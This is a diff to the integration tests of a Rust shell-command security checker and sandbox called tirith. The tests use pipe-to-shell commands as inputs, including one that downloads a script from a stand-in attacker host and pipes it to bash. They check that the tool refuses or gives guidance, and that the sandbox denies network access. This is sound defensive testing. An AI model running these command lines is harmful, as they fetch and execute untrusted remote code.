@@ -436,9 +436,8 @@ fn explain_fix_requires_rule() {
     );
 }
 
-#[cfg(unix)]
 #[test]
-fn check_suggest_safe_command_routes_pipe_to_hardened_runner() {
+fn check_suggest_safe_command_is_guidance_for_replaceable_test_binary() {
     let out = tirith()
         .args([
             "check",
@@ -448,7 +447,7 @@ fn check_suggest_safe_command_routes_pipe_to_hardened_runner() {
             "--no-daemon",
             "--suggest-safe-command",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
@@ -459,9 +458,10 @@ fn check_suggest_safe_command_routes_pipe_to_hardened_runner() {
         "expected safe-command block: {stderr}"
     );
     assert!(
-        stderr.contains("tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"),
-        "expected hardened runner rewrite: {stderr}"
+        stderr.contains("No safe executable rewrite"),
+        "expected explicit guidance-only rationale: {stderr}"
     );
+    assert!(!stderr.contains("try:"), "{stderr}");
     assert!(!stderr.contains("/tmp/"), "{stderr}");
     assert!(!stderr.contains("less /tmp/"), "{stderr}");
 }
@@ -488,9 +488,8 @@ fn check_suggest_safe_command_drops_insecure_tls_flag() {
     );
 }
 
-#[cfg(unix)]
 #[test]
-fn check_suggest_safe_command_json_embeds_suggestions() {
+fn check_suggest_safe_command_json_omits_untrusted_reinvocation() {
     let out = tirith()
         .args([
             "check",
@@ -502,7 +501,7 @@ fn check_suggest_safe_command_json_embeds_suggestions() {
             "--format",
             "json",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
@@ -512,16 +511,279 @@ fn check_suggest_safe_command_json_embeds_suggestions() {
         .as_array()
         .expect("safe_suggestions array present");
     assert!(!suggestions.is_empty(), "expected at least one suggestion");
-    let s = &suggestions[0];
+    let s = suggestions
+        .iter()
+        .find(|suggestion| suggestion["rule_id"] == "curl_pipe_shell")
+        .expect("curl_pipe_shell guidance");
     assert_eq!(s["rule_id"], "curl_pipe_shell");
-    assert_eq!(
-        s["safe_command"],
-        "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
+    assert!(
+        s.get("safe_command").is_none(),
+        "Cargo's user-owned test binary must never cross the delayed reinvocation boundary: {s}"
     );
+    assert!(s["rationale"]
+        .as_str()
+        .is_some_and(|rationale| rationale.contains("No safe executable rewrite")));
     // Findings still carry per-rule remediation independently of the flag.
     assert!(v["findings"][0]["remediation"]
         .as_str()
         .is_some_and(|s| !s.is_empty()));
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_launcher_refuses_missing_parent_temp_home_before_exec() {
+    let marker_dir = tempfile::tempdir().expect("marker tempdir");
+    let marker = marker_dir.path().join("executed");
+    let program = format!("printf launched > '{}'", marker.display());
+    let spec_json = serde_json::to_string(&tirith_core::capsule::CapsuleSpec::locked_down())
+        .expect("serialize locked-down spec");
+    let output = tirith()
+        .args([
+            "__capsule-child",
+            spec_json.as_str(),
+            "--",
+            "/bin/sh",
+            "-c",
+            program.as_str(),
+        ])
+        .output()
+        .expect("run hidden launcher without parent temp home");
+    assert!(!output.status.success());
+    assert!(
+        String::from_utf8_lossy(&output.stderr)
+            .contains("temporary_home requires a parent-owned, policy-granted --temp-home"),
+        "unexpected refusal: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert!(
+        !marker.exists(),
+        "missing temp-home refusal must precede exec"
+    );
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_launcher_runs_a_harmless_dynamic_stdin_shell() {
+    use std::os::fd::AsRawFd as _;
+    use std::os::unix::fs::PermissionsExt as _;
+    use std::os::unix::process::CommandExt as _;
+    use tirith_core::capsule::linux::LandlockSeccompCapsule;
+    use tirith_core::capsule::{Capsule as _, CapsuleSpec, ResourceLimits};
+    use tirith_core::trusted_child::TrustedExecutable;
+
+    const PLANTED_FD: i32 = 198;
+    let secret_dir = tempfile::tempdir().expect("private inherited-fd fixture");
+    let secret_path = secret_dir.path().join("secret");
+    fs::write(&secret_path, b"must not be inherited").expect("write inherited-fd fixture");
+    let secret = fs::File::open(&secret_path).expect("open inherited-fd fixture");
+    let interpreter = TrustedExecutable::from_absolute(Path::new("/bin/bash"), &[])
+        .expect("resolve canonical system bash")
+        .bind_content()
+        .expect("bind exact interpreter bytes before launch");
+
+    // Compile a tiny probe before containment. It distinguishes an actual
+    // `socket(2) -> EPERM` result from exec/loader/utility failures, so the test
+    // cannot mislabel an unrelated wget failure as network denial.
+    let helper_dir = tempfile::Builder::new()
+        .prefix("tirith-socket-probe-")
+        .tempdir_in("/tmp")
+        .expect("create direct socket probe directory");
+    let helper_source = helper_dir.path().join("socket_probe.c");
+    let helper_binary = helper_dir.path().join("socket-probe");
+    fs::write(
+        &helper_source,
+        b"#include <errno.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <sys/ioctl.h>\n#include <sys/socket.h>\n#include <unistd.h>\nint main(void) { errno = 0; if (fcntl(198, F_GETFD) != -1 || errno != EBADF) { printf(\"fd-198-not-closed-%d\", errno); return 39; } fputs(\"closed:\", stdout); struct winsize ws; errno = 0; (void)ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws); if (errno == EPERM) { fputs(\"safe-ioctl-blocked\", stdout); return 40; } char byte = 'x'; errno = 0; if (ioctl(STDIN_FILENO, TIOCSTI, &byte) == 0 || errno != EPERM) { printf(\"tiocsti-not-seccomp-eperm-%d\", errno); return 41; } fputs(\"descriptor-controls-ok:\", stdout); errno = 0; int fd = socket(AF_INET, SOCK_STREAM, 0); if (fd >= 0) { close(fd); fputs(\"network-open\", stdout); return 42; } if (errno == EPERM) { fputs(\"network-eperm\", stdout); return 0; } printf(\"network-other-%d\", errno); return 43; }\n",
+    )
+    .expect("write direct socket probe source");
+    let compile = Command::new("cc")
+        .args(["-O2", "-o"])
+        .arg(&helper_binary)
+        .arg(&helper_source)
+        .status()
+        .expect("run native compiler for direct socket probe");
+    assert!(compile.success(), "compile direct socket probe");
+    let helper_binary = helper_binary
+        .canonicalize()
+        .expect("canonical direct socket probe");
+
+    let temp_home = tempfile::Builder::new()
+        .prefix("tirith-capsule-integration-")
+        .tempdir_in("/tmp")
+        .expect("create parent-owned capsule HOME");
+    fs::set_permissions(temp_home.path(), fs::Permissions::from_mode(0o700))
+        .expect("secure parent-owned capsule HOME");
+    let temp_home_path = temp_home
+        .path()
+        .canonicalize()
+        .expect("canonical parent-owned capsule HOME");
+
+    let mut spec = CapsuleSpec::locked_down();
+    spec.resources = ResourceLimits {
+        cpu_seconds: Some(10),
+        memory_bytes: Some(512 * 1024 * 1024),
+        max_processes: Some(64),
+        max_open_files: Some(64),
+        max_output_bytes: None,
+        wall_clock_seconds: None,
+    };
+    spec.environment.allow = vec!["PATH".to_string()];
+    for root in [
+        "/bin",
+        "/usr/bin",
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64",
+        "/usr/share",
+        "/etc/ld.so.cache",
+        "/etc/nsswitch.conf",
+        "/etc/passwd",
+        "/etc/group",
+    ] {
+        let path = Path::new(root);
+        if let Ok(canonical) = path.canonicalize() {
+            if !spec.filesystem.read_roots.contains(&canonical) {
+                spec.filesystem.read_roots.push(canonical);
+            }
+        }
+    }
+    spec.filesystem.read_roots.push(
+        secret_dir
+            .path()
+            .canonicalize()
+            .expect("canonical secret root"),
+    );
+    let snapshot_dir = interpreter
+        .launch_path()
+        .parent()
+        .expect("bound snapshot parent")
+        .to_path_buf();
+    spec.filesystem.read_roots.push(snapshot_dir);
+    spec.filesystem.read_roots.push(
+        helper_dir
+            .path()
+            .canonicalize()
+            .expect("canonical socket probe root"),
+    );
+    spec.filesystem.read_roots.push(temp_home_path.clone());
+    spec.filesystem.write_roots.push(temp_home_path.clone());
+
+    let backend = LandlockSeccompCapsule;
+    let available = backend.available_coverage(&spec);
+    if available.is_degraded_against(&spec.required_coverage()) {
+        assert!(
+            std::env::var_os("TIRITH_REQUIRE_CAPSULE_RECEIPT").is_none(),
+            "required production capsule receipt cannot run: available={:?} required={:?}",
+            available,
+            spec.required_coverage()
+        );
+        eprintln!(
+            "skipping production capsule receipt: this Linux host lacks required Landlock/seccomp coverage"
+        );
+        return;
+    }
+
+    let spec_json = serde_json::to_string(&spec).expect("serialize production capsule spec");
+    let mut command = tirith();
+    command
+        .arg("__capsule-child")
+        .arg(spec_json)
+        .arg("--target-argv0")
+        .arg("bash")
+        .arg("--temp-home")
+        .arg(&temp_home_path)
+        .arg("--")
+        .arg(interpreter.launch_path())
+        .args(["-s", "--", "feature value"])
+        .arg(&helper_binary)
+        .env("PATH", "/bin:/usr/bin")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+    let source_fd = secret.as_raw_fd();
+    // SAFETY: this runs after fork in the child. dup2/fcntl/close are
+    // async-signal-safe, and all captured values are plain descriptors.
+    unsafe {
+        command.pre_exec(move || {
+            if libc::dup2(source_fd, PLANTED_FD) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            if libc::fcntl(PLANTED_FD, libc::F_SETFD, 0) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            Ok(())
+        });
+    }
+    let mut child = command.spawn().expect("spawn real hidden capsule launcher");
+    let script = "printf '<%s:%s>' \"$0\" \"$1\"\n\
+         printf home > \"$TMPDIR/probe\"\n\
+         IFS= read -r home_value < \"$TMPDIR/probe\"\n\
+         if [ \"$home_value\" = home ]; then printf ':home-ok'; else printf ':home-bad'; fi\n\
+         printf ':'\n\
+         if \"$2\"; then :; else exit 91; fi\n\
+         printf 'err' >&2\n";
+    child
+        .stdin
+        .take()
+        .expect("launcher stdin")
+        .write_all(script.as_bytes())
+        .expect("write exact reviewed stdin bytes");
+    let output = child.wait_with_output().expect("wait for contained shell");
+    assert!(
+        output.status.success(),
+        "production hidden launcher failed: status={:?} stderr={}",
+        output.status,
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let stdout = String::from_utf8(output.stdout).expect("contained shell UTF-8 stdout");
+    assert_eq!(
+        stdout,
+        "<bash:feature value>:home-ok:closed:descriptor-controls-ok:network-eperm",
+        "argv0, inherited-fd closure, HOME I/O, ioctl filtering, and direct socket denial must all be proven"
+    );
+    assert_eq!(output.stderr, b"err");
+    assert_eq!(
+        fs::read(temp_home_path.join("probe")).expect("read contained HOME probe"),
+        b"home"
+    );
+    drop(temp_home);
+    assert!(
+        !temp_home_path.exists(),
+        "parent-owned capsule HOME must be removed after the complete child exits"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn run_json_execution_refuses_before_network_and_emits_one_trusted_object() {
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind preflight probe");
+    listener
+        .set_nonblocking(true)
+        .expect("make preflight probe nonblocking");
+    let url = format!(
+        "http://127.0.0.1:{}/forged-output",
+        listener
+            .local_addr()
+            .expect("preflight probe address")
+            .port()
+    );
+
+    let out = tirith()
+        .args(["run", "--json", &url])
+        .output()
+        .expect("run JSON execution preflight");
+    assert_eq!(out.status.code(), Some(1));
+    let value: serde_json::Value = serde_json::from_slice(&out.stdout)
+        .expect("stdout must be exactly one parseable trusted JSON value");
+    assert_eq!(
+        value["error"],
+        "tirith run JSON output is inspection-only; pass --no-exec or omit --json before executing a remote script"
+    );
+    assert!(out.stderr.is_empty(), "unexpected stderr: {:?}", out.stderr);
+    assert!(
+        matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
+        "JSON execution refusal must happen before a loopback connection"
+    );
 }
 
 #[cfg(unix)]
@@ -8210,9 +8472,8 @@ fn fix_clean_command_human_prints_no_fix_needed() {
     );
 }
 
-#[cfg(unix)]
 #[test]
-fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
+fn fix_non_interactive_json_keeps_pipe_to_shell_guidance_only_for_test_binary() {
     // Acceptance: `tirith fix --json --non-interactive -- "curl … | bash"` emits a valid JSON
     // array of SafeSuggestion.
     let out = tirith()
@@ -8221,37 +8482,28 @@ fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
             "--json",
             "--non-interactive",
             "--",
-            "curl https://example.com/install.sh | bash",
+            "curl -fsSL https://example.com/install.sh | bash",
         ])
         .output()
         .expect("failed to run tirith");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
     let v: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix --json --non-interactive valid JSON");
     let arr = v
         .as_array()
         .expect("findings-present shape is a JSON array");
     assert!(!arr.is_empty(), "expected at least one suggestion");
-    // The pipe-to-shell rewrite must be one invocation of Tirith's hardened
-    // runner. No public fixed path, downloader, pager, or pathname reopen may
-    // escape through the executable field.
+    // The Cargo test binary is user-owned and replaceable after this process
+    // exits. The finding stays useful, but no executable delayed-reinvocation
+    // field may cross stdout/JSON.
     let curl_pipe = arr
         .iter()
         .find(|s| s["rule_id"] == "curl_pipe_shell")
         .expect("curl_pipe_shell suggestion present");
-    let sc = curl_pipe["safe_command"]
+    assert!(curl_pipe.get("safe_command").is_none(), "{curl_pipe}");
+    assert!(curl_pipe["rationale"]
         .as_str()
-        .expect("safe_command is a string for this transform");
-    assert_eq!(
-        sc,
-        "tirith run --capsule --script-stdin --interpreter bash 'https://example.com/install.sh'"
-    );
-    for forbidden in ["/tmp/", "curl ", "wget ", "less ", " && ", " | "] {
-        assert!(
-            !sc.contains(forbidden),
-            "runner rewrite must not expose historical stage {forbidden:?}: {sc}"
-        );
-    }
+        .is_some_and(|rationale| rationale.contains("No safe executable rewrite")));
     // Every suggestion must carry a non-empty `remediation` (honest guidance)
     // — this is the discipline that prevents fabricated rewrites.
     for s in arr {
@@ -8266,23 +8518,22 @@ fn fix_non_interactive_json_emits_array_for_pipe_to_shell() {
     }
 }
 
-#[cfg(unix)]
 #[test]
-fn fix_composes_multi_finding_rewrites_and_only_emits_an_allow_command() {
-    // Regression for repo-0149: dropping only `-k` would leave both the plain-
-    // HTTP sink and pipe-to-shell findings. The executable field must contain a
-    // composed final command, and that exact string must pass the same checker.
+fn fix_never_exposes_a_partial_multi_finding_rewrite_without_trusted_reinvocation() {
+    // Dropping only `-k` or changing only HTTP would leave the pipe-to-shell
+    // finding. With a replaceable Tirith test binary, the final capsule step is
+    // unavailable, so no partial executable command may be serialized.
     let out = tirith()
         .args([
             "fix",
             "--json",
             "--non-interactive",
             "--",
-            "curl -k http://attacker.invalid/script | bash",
+            "curl -k -fsSL http://attacker.invalid/script | bash",
         ])
         .output()
         .expect("failed to run tirith fix");
-    assert_eq!(out.status.code(), Some(2));
+    assert_eq!(out.status.code(), Some(1));
     let suggestions: serde_json::Value =
         serde_json::from_slice(&out.stdout).expect("fix output is JSON");
     let executable: Vec<&str> = suggestions
@@ -8291,37 +8542,9 @@ fn fix_composes_multi_finding_rewrites_and_only_emits_an_allow_command() {
         .iter()
         .filter_map(|suggestion| suggestion["safe_command"].as_str())
         .collect();
-    assert_eq!(
-        executable.len(),
-        1,
-        "only the composed, verified command may be executable: {suggestions}"
-    );
-    let command = executable[0];
-    assert_eq!(
-        command,
-        "tirith run --capsule --script-stdin --interpreter bash 'https://attacker.invalid/script'",
-        "TLS, transport, and pipe remediation must compose into one runner invocation"
-    );
-
-    let checked = tirith()
-        .args([
-            "check",
-            "--shell",
-            "posix",
-            "--non-interactive",
-            "--no-daemon",
-            "--offline",
-            "--",
-            command,
-        ])
-        .output()
-        .expect("re-analyze emitted command");
-    assert_eq!(
-        checked.status.code(),
-        Some(0),
-        "the exact executable suggestion must re-analyze to Allow; stderr={} stdout={}",
-        String::from_utf8_lossy(&checked.stderr),
-        String::from_utf8_lossy(&checked.stdout)
+    assert!(
+        executable.is_empty(),
+        "a partial or replaceable executable suggestion must not escape: {suggestions}"
     );
 }
 
